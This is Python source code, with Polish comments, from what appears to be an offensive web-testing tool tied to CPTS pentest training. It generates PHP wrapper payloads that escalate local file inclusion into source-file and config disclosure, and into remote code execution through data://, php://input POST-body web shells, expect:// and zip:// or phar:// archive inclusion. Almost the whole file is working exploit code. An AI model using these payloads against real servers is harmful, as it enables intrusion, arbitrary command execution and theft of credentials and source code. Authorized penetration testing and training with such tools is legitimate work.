"""PHP wrappers — drogi z LFI do RCE / odczytu źródeł.

Techniki z CPTS:
  * php://filter/convert.base64-encode  -> odczyt źródeł (FilterReadModule),
  * data://text/plain;base64,           -> RCE (wymaga allow_url_include),
  * php://input                          -> RCE przez body POST,
  * expect://                            -> bezpośrednie wykonanie komendy,
  * zip:// , phar://                     -> RCE z wgranego "obrazka".

RCE-owe payloady wstrzykują marker INCLUDED_RCE_OK w komendę, żeby
detekcja jednoznacznie potwierdziła wykonanie (echo markera).
"""
from __future__ import annotations

import base64
from collections.abc import Iterator

from ..config import Encoding
from ..detection import RCE_MARKER
from ..http_client import HttpClient, Response
from ..detection import Finding
from .base import BaseModule


def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


# Komenda, która na Linuksie i tak wyrzuci marker (echo) + realny wynik cfg.cmd.
def _cmd_with_marker(cmd: str) -> str:
    return f"echo {RCE_MARKER}; {cmd}"


class FilterReadModule(BaseModule):
    """Odczyt źródeł plików jako base64 (nie wykonuje kodu)."""
    name = "filter_read"
    description = "php://filter/convert.base64-encode — zrzut źródeł"
    expect_base64 = True

    # Typowe źródła wartościowe w whiteboxie + php.ini do sprawdzenia konfiguracji.
    _SOURCES = [
        "index", "config", "configure", "config.php", "db", "database",
        "../config", "/var/www/html/config.php",
        "../../../../etc/php/7.4/apache2/php.ini",
        "../../../../etc/php/8.1/apache2/php.ini",
    ]

    def _sources(self) -> list[str]:
        if self.cfg.target_file:
            return [self.cfg.target_file]
        return self._SOURCES

    def payloads(self) -> Iterator[str]:
        for res in self._sources():
            yield f"php://filter/convert.base64-encode/resource={res}"
            yield f"php://filter/read=convert.base64-encode/resource={res}"


class DataWrapperModule(BaseModule):
    """data:// — RCE gdy allow_url_include=On."""
    name = "data"
    description = "data://text/plain;base64 — RCE (allow_url_include)"

    def payloads(self) -> Iterator[str]:
        php = f"<?php system('{_cmd_with_marker(self.cfg.cmd)}'); ?>"
        b64 = _b64(php)
        yield f"data://text/plain;base64,{b64}"
        yield f"data://text/plain,{php}"


class ExpectWrapperModule(BaseModule):
    """expect:// — bezpośrednie wykonanie komendy (jeśli rozszerzenie załadowane)."""
    name = "expect"
    description = "expect:// — bezpośrednie wykonanie komendy"

    def payloads(self) -> Iterator[str]:
        yield f"expect://{_cmd_with_marker(self.cfg.cmd)}"


class InputWrapperModule(BaseModule):
    """php://input — web-shell w body POST.

    Nadpisuje run(): payload leci jako body, komenda w URL (jeśli GET dozwolony).
    Wymaga metody POST na parametrze podatnym.
    """
    name = "input"
    description = "php://input — RCE przez body POST (allow_url_include)"

    def payloads(self) -> Iterator[str]:
        yield "php://input"

    async def run(self, client: HttpClient) -> list[Finding]:
        # Hardkodujemy komendę w payloadzie (nie każdy target czyta GET).
        php = f"<?php system('{_cmd_with_marker(self.cfg.cmd)}'); ?>"
        # Tymczasowo podmieniamy body na web-shell.
        orig_data, orig_method = client.cfg.data, client.cfg.method
        client.cfg.data = php
        client.cfg.method = "POST"
        try:
            resp = await client.send("php://input", encoding=Encoding.NONE)
        finally:
            client.cfg.data, client.cfg.method = orig_data, orig_method
        finding = self.evaluate(resp)
        if self.cfg.verbose:
            print(f"    [{resp.status}] {resp.length:>7}B  php://input (POST body web-shell)")
        return [finding] if finding.confirmed else []


class ZipPharModule(BaseModule):
    """zip:// i phar:// — RCE z wgranego pliku-"obrazka".

    Wymaga znanej ścieżki wgranego archiwum (--file wskazuje na nie).
    Szkielet: generuje payloady include; samo spreparowanie/wgranie
    archiwum robisz osobno (opisane w materiale).
    """
    name = "zip_phar"
    description = "zip:// i phar:// — include wgranego archiwum (podaj --file)"

    def payloads(self) -> Iterator[str]:
        if not self.cfg.target_file:
            return  # bez ścieżki do archiwum nie ma co robić
        archive = self.cfg.target_file
        yield f"zip://{archive}%23shell.php"
        yield f"phar://{archive}%2Fshell.txt"
